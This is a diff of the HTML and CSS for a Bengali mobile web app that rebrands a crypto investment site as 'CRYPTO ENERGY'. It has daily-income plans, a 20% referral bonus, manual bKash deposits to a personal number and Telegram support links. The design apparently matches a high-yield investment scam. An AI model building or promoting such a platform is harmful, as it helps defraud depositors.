@@ -1,98 +1,144 @@
 
+                                                                     
 <!DOCTYPE html>
 <html lang="bn">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
-<title>Crypto Invest Pro</title>
+<title>CRYPTO ENERGY</title>
 <style>
 :root {
-  --bg: #0b0f19; 
-  --card-bg: #151c2c;
-  --text: #ffffff; 
-  --muted: #8492a6;
-  --black: #000000; 
-  --white: #ffffff; 
-  --accent: #f3ba2f; 
-  --danger: #ff4d4d;
-  --success: #00c853;
-  --glass: rgba(255, 255, 255, 0.05);
+  --bg-gradient: linear-gradient(180deg, #0bb870 0%, #068f56 100%);
+  --main-bg: #0b3d2c;
+  --card-bg: #114d38;
+  --text-white: #ffffff;
+  --text-muted: #a3c7bc;
+  --accent-gold: #f3ba2f;
+  --btn-white: #ffffff;
+  --btn-text-dark: #0b3d2c;
+  --nav-bg: #072a1e;
+  --nav-active: #0bb870;
+  --danger: #ef4444;
+  --success: #10b981;
 }
-* { box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; margin:0; padding:0; }
-html, body { height: 100%; background: var(--bg); color: var(--text); overflow-x: hidden; }
+
+* { box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+html, body { height: 100%; background: var(--main-bg); color: var(--text-white); overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
 body { display: flex; flex-direction: column; }
 
+/* টোস্ট নোটিফিকেশন */
 #toast {
   position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
-  background: var(--card-bg); color: var(--text); border: 1px solid var(--accent);
-  padding: 12px 24px; border-radius: 30px; font-weight: bold; font-size: 14px;
-  z-index: 10000; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: top 0.4s ease;
+  background: rgba(7, 42, 30, 0.95); color: var(--text-white); border: 1px solid var(--nav-active);
+  padding: 12px 24px; border-radius: 30px; font-weight: 600; font-size: 14px;
+  z-index: 10000; box-shadow: 0 8px 32px rgba(0,0,0,0.4); transition: top 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  backdrop-filter: blur(8px); text-align: center; width: 85%; max-width: 400px;
 }
 #toast.show { top: 20px; }
 
-#loader { position: fixed; inset: 0; background: #0b0f19; display: flex; align-items: center; justify-content: center; z-index: 9999; }
-.loaderLayer { width: 320px; height: 220px; position: relative; }
-.coin { position: absolute; width: 45px; height: 45px; border-radius: 50%; background: linear-gradient(180deg, #ffe066, #f3ba2f); display: flex; align-items: center; justify-content: center; color: #5c4300; font-weight: 900; opacity: 0; box-shadow: 0 0 20px rgba(243, 186, 47, 0.6); }
-.c1 { left: 20px; animation: fall 2.5s linear infinite; }
-.c2 { left: 90px; animation: fall 2.8s linear infinite; animation-delay: .3s; }
-.c3 { left: 160px; animation: fall 2.2s linear infinite; animation-delay: .6s; }
-.c4 { left: 230px; animation: fall 3s linear infinite; animation-delay: .1s; }
-@keyframes fall {
-  0% { transform: translateY(-100px) rotate(0deg); opacity: 0; }
-  20% { opacity: 1; }
-  80% { opacity: 1; }
-  100% { transform: translateY(300px) rotate(360deg); opacity: 0; }
-}
+/* প্রিমিয়াম লোডার */
+#loader { position: fixed; inset: 0; background: var(--main-bg); display: flex; align-items: center; justify-content: center; z-index: 9999; }
+.spinner { width: 45px; height: 45px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--nav-active); border-radius: 50%; animation: spin 1s infinite linear; }
+@keyframes spin { to { transform: rotate(360deg); } }
 
+/* হেডার */
 header { 
-  background: var(--card-bg); border-bottom: 1px solid var(--glass); padding: 16px; 
+  background: var(--card-bg); border-bottom: 1px solid rgba(255,255,255,0.05); padding: 0 16px; 
   display: flex; justify-content: space-between; align-items: center;
-  position: sticky; top: 0; z-index: 50; height: 60px;
+  position: sticky; top: 0; z-index: 50; height: 56px;
 }
-.headerTitle { font-weight: 800; font-size: 16px; color: var(--accent); letter-spacing: 1px; flex-grow: 1; text-align: center; }
-.headBtn { background: var(--glass); border: none; color: var(--text); padding: 6px 12px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 12px; }
-#adminBtn { background: var(--accent); color: var(--black); }
+.headerTitle { font-weight: bold; font-size: 16px; color: var(--text-white); flex-grow: 1; text-align: center; }
+.headBtn { background: transparent; border: none; color: var(--text-white); padding: 8px; font-size: 16px; cursor: pointer; display: flex; align-items: center; }
+#adminBtn { background: var(--accent-gold); color: #000; font-weight: bold; padding: 5px 10px; border-radius: 6px; font-size: 12px; }
 
-.mainContent { flex: 1; overflow-y: auto; padding: 16px; padding-bottom: 120px; -webkit-overflow-scrolling: touch; }
-.container { max-width: 600px; margin: 0 auto; }
-.card { background: var(--card-bg); border-radius: 16px; padding: 16px; border: 1px solid var(--glass); box-shadow: 0 8px 32px rgba(0,0,0,0.2); margin-bottom: 16px; }
-.muted { color: var(--muted); font-size: 13px; }
-
-.btn { background: var(--accent); color: var(--black); border: none; padding: 12px; border-radius: 12px; cursor: pointer; font-weight: 800; width: 100%; transition: all 0.2s; display: block; text-align: center; text-decoration: none;}
-.btn:active { transform: scale(0.98); opacity: 0.9; }
-.btn.secondary { background: transparent; color: var(--text); border: 1px solid var(--glass); }
-.btn.danger { background: var(--danger); color: white; }
-
-.inputGroup { position: relative; margin-top: 10px; }
-input, select { width: 100%; padding: 12px; border-radius: 12px; border: 1px solid var(--glass); background: rgba(0,0,0,0.2); color: #fff; font-size: 14px; outline: none; }
-input:focus { border-color: var(--accent); }
-.eyeBtn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: var(--muted); cursor: pointer; font-size: 16px; }
-
-.page { display: none; animation: fadeIn 0.3s ease-in-out; }
+/* কন্টেন্ট এরিয়া */
+.mainContent { flex: 1; overflow-y: auto; padding-bottom: 90px; -webkit-overflow-scrolling: touch; }
+.page { display: none; padding: 16px; }
 .page.active { display: block; }
-@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-.plans { display: grid; grid-template-columns: repeat(2, 1fr); gap: 14px; margin-top: 10px; }
-.plan { background: var(--card-bg); border: 1px solid var(--glass); border-radius: 16px; padding: 14px; text-align: center; transition: 0.3s; }
-.crypto-img { width: 50px; height: 50px; margin-bottom: 10px; object-fit: contain; }
-.planTitle { font-weight: 800; font-size: 15px; }
-.planSub { color: var(--accent); font-size: 13px; font-weight: 700; margin: 4px 0 10px; }
+/* হোম পেজ গ্রীন টপ ও ব্যানার কার্ড */
+.home-top-section { background: var(--bg-gradient); padding: 20px 16px 40px; border-bottom-left-radius: 24px; border-bottom-right-radius: 24px; text-align: center; }
+.support-box { background: rgba(255, 255, 255, 0.08); border-radius: 16px; padding: 16px; margin-top: 10px; text-align: left; }
+.support-title { font-size: 14px; font-weight: bold; border-left: 3px solid #fff; padding-left: 8px; margin-bottom: 6px; }
+.support-sub { font-size: 12px; color: rgba(255,255,255,0.8); margin-bottom: 12px; }
+.support-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.support-btn { background: #0b7a4f; color: #fff; padding: 10px; border-radius: 12px; text-decoration: none; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 6px; font-weight: 500; }
 
-.bottomNav { position: fixed; left: 0; right: 0; bottom: 0; height: 70px; background: var(--card-bg); border-top: 1px solid var(--glass); display: flex; justify-content: space-around; align-items: center; z-index: 100; }
-.navBtn { background: transparent; color: var(--muted); border: none; padding: 8px; cursor: pointer; font-size: 12px; font-weight: 600; display: flex; flex-direction: column; gap: 4px; align-items: center; }
-.navBtn.active { color: var(--accent); }
+/* সোলার প্রোডাক্ট কার্ড ডিজাইন */
+.solar-card { background: var(--card-bg); border-radius: 20px; overflow: hidden; margin-top: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+.solar-img { width: 100%; height: 180px; object-fit: cover; display: block; }
+.solar-details { padding: 16px; }
+.solar-title { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 15px; }
+.solar-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1px; background: rgba(255,255,255,0.05); border-radius: 10px; padding: 10px 5px; margin-bottom: 15px; text-align: center; }
+.grid-item { display: flex; flex-direction: column; justify-content: center; }
+.grid-label { font-size: 10px; color: var(--text-muted); margin-bottom: 4px; }
+.grid-val { font-size: 13px; font-weight: bold; color: #fff; }
+.solar-footer { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+.solar-price-label { font-size: 11px; color: var(--text-muted); }
+.solar-price-val { font-size: 18px; font-weight: bold; color: #fff; margin-top: 2px; }
+.solar-badge { background: rgba(0,0,0,0.3); color: var(--text-white); font-size: 11px; padding: 4px 10px; border-radius: 20px; }
+.solar-action-btn { background: var(--btn-white); color: var(--btn-text-dark); border: none; width: 100%; padding: 12px; border-radius: 25px; font-weight: bold; font-size: 14px; cursor: pointer; transition: 0.2s; }
+.solar-action-btn:active { transform: scale(0.98); opacity: 0.9; }
+
+/* লেনদেন বিবরণী রেকর্ড ট্যাব */
+.account-asset-card { background: var(--card-bg); border-radius: 16px; padding: 20px; margin-bottom: 16px; }
+.tabs-container { display: flex; background: rgba(255,255,255,0.08); padding: 4px; border-radius: 25px; margin-bottom: 16px; }
+.tab-btn { flex: 1; background: transparent; border: none; color: var(--text-white); padding: 10px; text-align: center; font-size: 13px; font-weight: 500; border-radius: 20px; cursor: pointer; }
+.tab-btn.active { background: var(--btn-white); color: var(--btn-text-dark); font-weight: bold; }
+.empty-box { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 40px 20px; text-align: center; color: var(--text-muted); font-size: 13px; }
+
+/* জমা/রিচার্জ পেজ গেটওয়ে সিলেক্টর */
+.gateway-card { background: rgba(255,255,255,0.03); border: 2px solid rgba(255,255,255,0.08); border-radius: 16px; padding: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; cursor: pointer; }
+.gateway-card.selected { border-color: var(--btn-white); background: rgba(255,255,255,0.06); }
+.gateway-info { display: flex; align-items: center; gap: 12px; }
+.gateway-logo { width: 40px; height: 40px; border-radius: 8px; object-fit: cover; background: #fff; }
+.gateway-radio { width: 18px; height: 18px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.4); display: flex; align-items: center; justify-content: center; }
+.gateway-card.selected .gateway-radio { border-color: var(--btn-white); background: var(--btn-white); }
+.gateway-card.selected .gateway-radio::after { content: '✓'; color: var(--btn-text-dark); font-size: 11px; font-weight: bold; }
+.instruction-card { background: rgba(255,255,255,0.04); border-radius: 16px; padding: 16px; margin-bottom: 20px; font-size: 12px; line-height: 1.6; }
+.inst-step { display: flex; gap: 10px; margin-top: 12px; align-items: flex-start; }
+.inst-num { background: rgba(255,255,255,0.15); width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; flex-shrink: 0; }
+.amount-chips { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 15px 0; }
+.chip { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); padding: 12px; text-align: center; border-radius: 10px; font-weight: bold; font-size: 14px; cursor: pointer; }
+.chip.active { background: var(--btn-white); color: var(--btn-text-dark); border-color: var(--btn-white); }
+
+/* ইনপুট ফিল্ড ও ফর্ম এলিমেন্ট */
+input, select { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.15); background: rgba(0,0,0,0.2); color: #fff; font-size: 14px; outline: none; margin-top: 6px; }
+input:focus { border-color: var(--nav-active); }
+.input-group { position: relative; width: 100%; }
+.eyeBtn { position: absolute; right: 14px; top: 50%; transform: translateY(-20%); background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 16px; }
+.btn-primary { background: var(--btn-white); color: var(--btn-text-dark); border: none; width: 100%; padding: 14px; border-radius: 25px; font-weight: bold; font-size: 15px; cursor: pointer; display: block; text-align: center; text-decoration: none; margin-top: 15px; }
+
+/* বিনিয়োগ (আয়) পেজ ড্যাশবোর্ড */
+.invest-dashboard { background: var(--card-bg); border-radius: 24px; padding: 20px; margin-bottom: 20px; }
+.dash-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; }
+.dash-item { background: rgba(0,0,0,0.15); padding: 14px; border-radius: 14px; }
+.dash-label { font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 5px; }
+.dash-val { font-size: 16px; font-weight: bold; margin-top: 6px; }
+
+/* আমার (প্রোফাইল) পেজ লেআউট */
+.profile-header { background: var(--bg-gradient); padding: 24px 16px; border-bottom-left-radius: 24px; border-bottom-right-radius: 24px; display: flex; align-items: center; gap: 16px; }
+.avatar-circle { width: 55px; height: 55px; border-radius: 50%; background: rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; border: 2px solid #fff; }
+.profile-meta-title { font-size: 12px; color: var(--text-muted); margin-bottom: 4px; text-transform: uppercase; }
+.menu-section-title { font-size: 13px; font-weight: bold; color: var(--text-white); border-left: 3px solid var(--nav-active); padding-left: 8px; margin: 20px 0 10px 4px; }
+.menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.menu-item { background: var(--card-bg); padding: 14px 12px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; text-decoration: none; color: #fff; }
+.menu-left { display: flex; align-items: center; gap: 10px; font-size: 13px; font-weight: 500; }
+.menu-arrow { color: var(--text-muted); font-size: 12px; }
+
+/* অথেনটিকেশন ওভারলে */
+#authOverlay { position: fixed; inset: 0; background: var(--main-bg); display: flex; align-items: center; justify-content: center; z-index: 4000; background-image: radial-gradient(circle at center, #114d38 0%, #0b3d2c 100%); }
+.authCard { width: 90%; max-width: 400px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); padding: 28px 20px; border-radius: 24px; backdrop-filter: blur(10px); }
+
+/* বটম নেভিগেশন বার */
+.bottomNav { position: fixed; left: 0; right: 0; bottom: 0; height: 60px; background: var(--nav-bg); border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-around; align-items: center; z-index: 100; }
+.navBtn { background: transparent; color: var(--text-muted); border: none; height: 100%; flex: 1; cursor: pointer; font-size: 11px; font-weight: 500; display: flex; flex-direction: column; justify-content: center; gap: 4px; align-items: center; transition: all 0.2s; }
+.navBtn.active { color: var(--nav-active); font-weight: bold; }
 .navIcon { font-size: 18px; }
-
-.listItem { padding: 12px; border-radius: 12px; background: rgba(0,0,0,0.15); border: 1px solid var(--glass); margin-bottom: 10px; font-size: 14px; }
-
-#authOverlay { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 4000; }
-.authCard { width: 90%; max-width: 400px; background: var(--card-bg); padding: 24px; border-radius: 24px; border: 1px solid var(--glass); }
-.authToggle { margin-top: 16px; text-align: center; color: var(--accent); cursor: pointer; font-size: 14px; }
-
-.support-floating { position: fixed; bottom: 85px; right: 16px; z-index: 99; background: #0088cc; color: #fff; padding: 10px 16px; border-radius: 30px; font-weight: bold; font-size: 13px; text-decoration: none; display: flex; align-items: center; gap: 6px; box-shadow: 0 4px 15px rgba(0,136,204,0.4); }
+.navBtn.active .navIcon { transform: scale(1.1); }
 </style>
 
-<!-- ফায়ারবেস স্ক্রিপ্ট -->
+<!-- ফায়ারবেস কোর ও স্টোর স্ক্রিপ্ট -->
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
 </head>
@@ -101,192 +147,335 @@ input:focus { border-color: var(--accent); }
 <div id="toast">বার্তা</div>
 
 <header>
-  <button class="headBtn" id="backBtn" onclick="goBack()">⬅️ Back</button>
-  <div class="headerTitle">CRYPTO INVEST PRO</div>
-  <button id="adminBtn" class="headBtn" style="display:none;">ADMIN</button>
+  <button class="headBtn" id="backBtn" onclick="goBack()" style="visibility: hidden;">◀</button>
+  <div class="headerTitle" id="pageMainHeaderTitle">CRYPTO ENERGY</div>
+  <button id="adminBtn" style="display:none;">ADMIN</button>
 </header>
 
-<div id="loader">
-  <div class="loaderLayer">
-    <div class="coin c1">₿</div><div class="coin c2">Ξ</div><div class="coin c3">◎</div><div class="coin c4">₳</div>
-  </div>
-</div>
+<div id="loader"><div class="spinner"></div></div>
 
-<a href="https://t.me/CRYPTO50580" target="_blank" class="support-floating" id="tgSupport" style="display:none;">
-  <span>✈️</span> Customer Care
-</a>
-
+<!-- লগইন ও সাইনআপ ফর্ম -->
 <div id="authOverlay" style="display:none">
   <div class="authCard">
-    <h2 id="authTitle" style="text-align:center; color:var(--accent); margin-bottom:6px;">Welcome Back</h2>
-    <p style="text-align:center; color:var(--muted); font-size:14px; margin-bottom:20px;">Crypto Investment Platform</p>
-    <div class="inputGroup"><input id="authPhone" placeholder="মোবাইল নাম্বার (01XXXXXXXXX)" /></div>
-    <div class="inputGroup">
-      <input id="authPass" type="password" placeholder="পাসওয়ার্ড (৬+ সংখ্যা)" />
-      <button class="eyeBtn" type="button" onclick="togglePassView('authPass', this)">👁️</button>
+    <div style="text-align: center; margin-bottom: 15px;">
+      <img src="https://images.unsplash.com/photo-1621416894569-0f39ed31d247?auto=format&fit=crop&w=150&q=80" style="width: 70px; height: 70px; border-radius: 50%; border: 2px solid var(--accent-gold);" alt="Logo">
     </div>
-    <button class="btn" id="authPrimary" style="margin-top:20px;">লগইন করুন</button>
-    <div class="authToggle" id="toggleAuth">নতুন অ্যাকাউন্ট খুলুন (Signup)</div>
+    <h2 id="authTitle" style="text-align:center; color:#fff; margin-bottom:6px; font-weight:bold;">Welcome Back</h2>
+    <p style="text-align:center; color:var(--text-muted); font-size:13px; margin-bottom:24px;">Crypto Energy Platform</p>
+    <div>
+      <label class="solar-price-label">মোবাইল নাম্বার</label>
+      <input id="authPhone" placeholder="01XXXXXXXXX" />
+    </div>
+    <div style="margin-top:12px;">
+      <label class="solar-price-label">পাসওয়ার্ড</label>
+      <div class="input-group">
+        <input id="authPass" type="password" placeholder="৬+ ডিজিট পাসওয়ার্ড" />
+        <button class="eyeBtn" type="button" onclick="togglePassView('authPass', this)">👁️</button>
+      </div>
+    </div>
+    <button class="btn-primary" id="authPrimary" style="margin-top:24px;">লগইন করুন</button>
+    <div id="toggleAuth" style="margin-top:20px; text-align:center; color:var(--nav-active); cursor:pointer; font-size:13px; text-decoration:underline;">নতুন অ্যাকাউন্ট তৈরি করুন (Signup)</div>
   </div>
 </div>
 
 <div class="mainContent" id="app" style="display:none">
-  <div class="container">
-
-    <div id="topWalletCard" class="card" style="background:linear-gradient(135deg, #1e293b, #151c2c);">
+  
+  <!-- ১. হোম পেজ ইন্টারফেস -->
+  <section id="homePage" class="page active">
+    <div class="home-top-section">
+      <div style="margin-bottom: 15px;">
+        <img src="https://images.unsplash.com/photo-1621416894569-0f39ed31d247?auto=format&fit=crop&w=150&q=80" style="width: 65px; height: 65px; border-radius: 50%; box-shadow: 0 4px 10px rgba(0,0,0,0.3);" alt="Logo">
+        <h2 style="font-size: 20px; color: #fff; margin-top: 5px;">CRYPTO ENERGY</h2>
+      </div>
       <div style="display:flex; justify-content:space-between; align-items:center;">
-        <div>
-          <div class="muted">অ্যাকাউন্ট আইডি</div>
-          <div id="mePhone" style="font-weight:800; color:var(--accent); font-size:15px;">--</div>
+        <div style="text-align: left;">
+          <div style="font-size:11px; opacity:0.8;">সদস্য আইডি</div>
+          <div id="mePhone" style="font-weight:bold; font-size:15px; margin-top:2px;">01XXXXXXXXX</div>
         </div>
-        <div style="text-align:right">
-          <div class="muted">টোটাল ব্যালেন্স</div>
-          <div id="meBalance" style="font-weight:900; font-size:22px;">0 ৳</div>
+        <div style="text-align:right;">
+          <div style="font-size:11px; opacity:0.8;">মোট একাউন্ট ব্যালেন্স</div>
+          <div id="meBalance" style="font-weight:bold; font-size:20px; color:#fff; margin-top:2px;">৳ 0.00</div>
         </div>
       </div>
       
-      <div id="runningPanelTrigger" onclick="showPage('activePlans')" style="margin-top:12px; padding:10px; background:rgba(243,186,47,0.08); border:1px dashed var(--accent); border-radius:10px; display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
-        <div style="display:flex; align-items:center; gap:8px; width: 100%;">
-          <span class="muted" style="font-weight:bold; white-space:nowrap;">রানিং মাইনিং প্যানেল:</span>
-          <marquee id="mePlan" style="font-weight:800; color:var(--accent); margin-left:5px;">NONE</marquee>
+      <!-- গ্রাহক সেবা মডিউল -->
+      <div class="support-box">
+        <div class="support-title">ব্যবসায়িক গ্রাহক সেবা</div>
+        <div class="support-sub">অ্যাকাউন্ট, অর্ডার ও তহবিল ক্রয়ে অফিসিয়াল টেলিগ্রাম দলের সাথে যোগাযোগ করুন।</div>
+        <div class="support-buttons">
+          <a href="https://t.me/Cryptoenergyincome" target="_blank" class="support-btn">✈️ টেলিগ্রাম চ্যানেল</a>
+          <a href="https://t.me/CryptoangencySupport" target="_blank" class="support-btn">✈️ টেলিগ্রাম গ্রুপ</a>
         </div>
       </div>
     </div>
 
-    <section id="homePage" class="page active">
-      <div style="font-weight:800; font-size:14px; margin-bottom:10px; color:var(--muted)">ক্রিপ্টোকারেন্সি ইনভেস্টমেন্ট প্ল্যানসমূহ:</div>
-      <div class="plans" id="plansGrid"></div>
-    </section>
+    <!-- ইনভেস্টমেন্ট প্যাকেজ সমূহের তালিকা -->
+    <div style="font-size:14px; font-weight:bold; margin:20px 0 5px 4px;">ক্রিপ্টো এনার্জি ইনভেস্টমেন্ট প্ল্যান:</div>
+    <div id="plansGrid"></div>
+  </section>
 
-    <section id="activePlansPage" class="page">
-      <div style="font-weight:800; color:var(--muted); margin-bottom:12px;">আপনার সচল (Active) মাইনিং প্যানেলসমূহ:</div>
-      <div id="activePlansList"></div>
-    </section>
-
-    <section id="detailPage" class="page">
-      <div class="card" style="text-align:center;">
-        <img id="detailImg" src="" style="width:80px; height:80px; margin-bottom:12px; object-fit:contain;" />
-        <h2 id="detailTitle" style="color:var(--accent)">-</h2>
-        <div class="listItem" style="margin-top:14px; text-align:left;">
-          <p style="margin-bottom:6px;">💰 প্যাকেজ মূল্য: <b id="detailPrice" style="color:var(--accent)">-</b></p>
-          <p style="margin-bottom:6px;">📈 দৈনিক আয়: <b id="detailDaily" style="color:var(--success)">-</b></p>
-          <p>⏳ মেয়াদকাল: <b style="color:var(--accent)">৩৬৫ দিন</b></p>
+  <!-- ২. বিনিয়োগ (আয়) পেজ ইন্টারফেস -->
+  <section id="incomePage" class="page">
+    <div class="invest-dashboard">
+      <div style="display:flex; justify-content:space-between; align-items:center;">
+        <span style="font-size:18px; font-weight:bold;">বিনিয়োগ ড্যাশবোর্ড</span>
+        <div class="solar-badge" style="background:rgba(255,255,255,0.1);">মোট পণ্য: <span id="dashTotalProducts">0</span></div>
+      </div>
+      <div class="dash-grid">
+        <div class="dash-item">
+          <div class="dash-label">💰 মোট আয়</div>
+          <div class="dash-val" id="dashTotalEarn">৳ 0.00</div>
         </div>
-        <button class="btn" style="margin-top:10px;" id="detailActionBtn">প্যাকটি কিনুন</button>
-      </div>
-    </section>
-
-    <section id="depositPage" class="page">
-      <div class="card">
-        <h3 style="color:var(--accent); margin-bottom:12px;">Manual Deposit (বিকাশ পার্সোনাল নাম্বার সেন্ডমানি)</h3>
-        <div class="muted"> নিচ্ছেন প্যাক</div>
-        <input id="depositPlan" readonly style="margin-top:6px;" />
-        <div class="muted" style="margin-top:10px">প্রয়োজনীয় টাকা (৳)</div>
-        <input id="depositAmount" type="number" style="margin-top:6px;" />
-        <div class="muted" style="margin-top:10px">সেন্ড মানি করার পর ট্রানজেকশন ID (TxID) দিন</div>
-        <input id="depositTx" placeholder="Example: TRX982348" style="margin-top:6px;" />
-        
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-top:14px; padding:12px; background:rgba(0,0,0,0.2); border-radius:12px;">
-          <div>
-            <span class="muted" style="font-size:11px; display:block">বিকাশ পার্সোনাল নাম্বার</span>
-            <span style="font-weight:800; font-size:16px; color:var(--accent)">01797025790</span>
-          </div>
-          <button class="btn" style="width:70px; padding:8px;" onclick="copyBkash()">কপি</button>
+        <div class="dash-item">
+          <div class="dash-label">🏦 মোট বিনিয়োগ</div>
+          <div class="dash-val" id="dashTotalInvest">৳ 0.00</div>
         </div>
-        
-        <p style="color: #ffda79; font-size: 13px; font-weight: bold; margin-top: 14px; text-align: center; line-height: 1.5;">
-          ⚠️ আপনার টাকা ডিপি করার পর ৫ মিনিট হতে ১ ঘণ্টার ভিতরে আপনার কেনা প্ল্যানটি একটিভ হয়ে যাবে।
-        </p>
-
-        <button class="btn" style="margin-top:18px;" onclick="submitDeposit()">ডিপোজিট রিকোয়েস্ট পাঠান</button>
-      </div>
-    </section>
-
-    <section id="teamPage" class="page">
-      <div class="card">
-        <h3 style="color:var(--accent); margin-bottom:6px;">রেফারেল নেটওয়ার্ক</h3>
-        <p class="muted" style="margin-bottom:12px;">বন্ধুদের আমন্ত্রণ জানান এবং প্রতিটি ডিপোজিটে ২০% ইনস্ট্যান্ট বোনাস পান!</p>
-        <input id="refLink" readonly style="color:var(--accent); font-weight:600;" />
-        <button class="btn" id="copyRefBtn" style="margin-top:12px;">রেফার লিংক কপি করুন</button>
-      </div>
-      <div style="font-weight:800; margin-bottom:10px; color:var(--muted)">আপনার রেফারে জয়েন করা মেম্বারদের ডিপোজিট হিস্ট্রি:</div>
-      <div id="friendsList"></div>
-    </section>
-
-    <section id="withdrawPage" class="page">
-      <div class="card" style="border: 1px solid rgba(243, 186, 47, 0.3); background: rgba(243, 186, 47, 0.05);">
-        <p style="color: var(--accent); font-size: 13px; font-weight: bold; text-align: center; line-height: 1.5;">
-          📢 টাকা উত্তোলন করার পর ২০ মিনিট হতে ২৪ ঘণ্টার মধ্যে টাকা আপনার একাউন্টে পাঠিয়ে দেওয়া হবে।
-        </p>
-      </div>
-
-      <div class="card">
-        <h3 style="color:var(--accent); margin-bottom:14px;">উইথড্র ফান্ড</h3>
-        <select id="wMethod" style="margin-bottom:12px;">
-          <option value="bKash">bKash (বিকাশ)</option>
-          <option value="Nagad">Nagad (নগদ)</option>
-        </select>
-        <input id="wNumber" placeholder="টাকা নেওয়ার পার্সোনাল নাম্বার দিন" style="margin-bottom:12px;" />
-        <input id="wAmount" type="number" placeholder="উইথড্র পরিমাণ (সর্বনিম্ন ৪০০ ৳)" style="margin-bottom:12px;" />
-        <div class="inputGroup" style="margin-top:0; margin-bottom:16px;">
-          <input id="wPass" type="password" placeholder="আপনার একাউন্টের পাসওয়ার্ড দিন" />
-          <button class="eyeBtn" type="button" onclick="togglePassView('wPass', this)">👁️</button>
+        <div class="dash-item">
+          <div class="dash-label">📅 আজকের আয়</div>
+          <div class="dash-val" id="dashTodayEarn">৳ 0.00</div>
         </div>
-        <button class="btn" onclick="requestWithdraw()">উইথড্র সাবমিট করুন</button>
-        <button class="btn secondary" style="margin-top:10px;" onclick="showPage('withdrawHistory')">উইথড্র হিস্ট্রি রেকর্ডস</button>
+        <div class="dash-item">
+          <div class="dash-label">📈 আনুমানিক মোট আয়</div>
+          <div class="dash-val" id="dashEstEarn">৳ 0.00</div>
+        </div>
       </div>
-    </section>
+    </div>
 
-    <section id="withdrawHistory" class="page">
-      <div style="font-weight:800; color:var(--muted); margin-bottom:12px;">উইথড্র ট্রানজেকশন রেকর্ড:</div>
-      <div id="withdrawList"></div>
-    </section>
+    <div class="tabs-container">
+      <button class="tab-btn active" id="incActiveTab" onclick="toggleIncomeTab('active')">সক্রিয় মেয়াদ</button>
+      <button class="tab-btn" id="incExpiredTab" onclick="toggleIncomeTab('expired')">মেয়াদের বাইরে</button>
+    </div>
+    
+    <div id="incomePlansList"></div>
+  </section>
 
-    <section id="profilePage" class="page">
-      <div class="card" style="text-align:center; padding:20px;">
-        <div style="font-size:45px; margin-bottom:6px;">👤</div>
-        <h3 id="pfPhone" style="color:var(--accent)">01XXXXXXXXX</h3>
-        <p id="pfBalance" style="font-weight:800; font-size:16px; margin-top:4px; margin-bottom:16px;">0 ৳</p>
-        <button class="btn danger" onclick="logout()">লগআউট করুন (Logout)</button>
+  <!-- ৩. রিচার্জ/জমা চ্যানেল পেজ -->
+  <section id="depositChannelPage" class="page">
+    <div style="font-size:14px; font-weight:bold; margin-bottom:15px; border-left:3px solid var(--nav-active); padding-left:8px;">পেমেন্ট চ্যানেল বাছুন</div>
+    
+    <div class="gateway-card selected" onclick="selectGateway('bKash')">
+      <div class="gateway-info">
+        <img src="https://tds-images.thedailystar.net/rating/icon/bkash.png" class="gateway-logo" alt="bkash">
+        <div>
+          <div style="font-weight:bold; font-size:14px;">BKASH (বিকাশ পার্সোনাল)</div>
+          <div style="font-size:11px; color:var(--text-muted);">উপলব্ধ ১টি চ্যানেল</div>
+        </div>
       </div>
+      <div class="gateway-radio"></div>
+    </div>
+
+    <button class="btn-primary" onclick="proceedToAmountPage()">চালিয়ে যান</button>
+
+    <div class="instruction-card" style="margin-top:20px;">
+      <div style="font-weight:bold; font-size:13px; color:var(--nav-active);">ℹ️ জমা কীভাবে কাজ করে</div>
+      <div class="inst-step">
+        <div class="inst-num">1</div>
+        <div>নির্ধারিত পরিমাণ বা কাস্টম মান বেছে নিন, তারপর চালিয়ে যান ট্যাপ করে নিরাপদ গেটওয়ে তথ্য ফর্মটি খুলুন।</div>
+      </div>
+      <div class="inst-step">
+        <div class="inst-num">2</div>
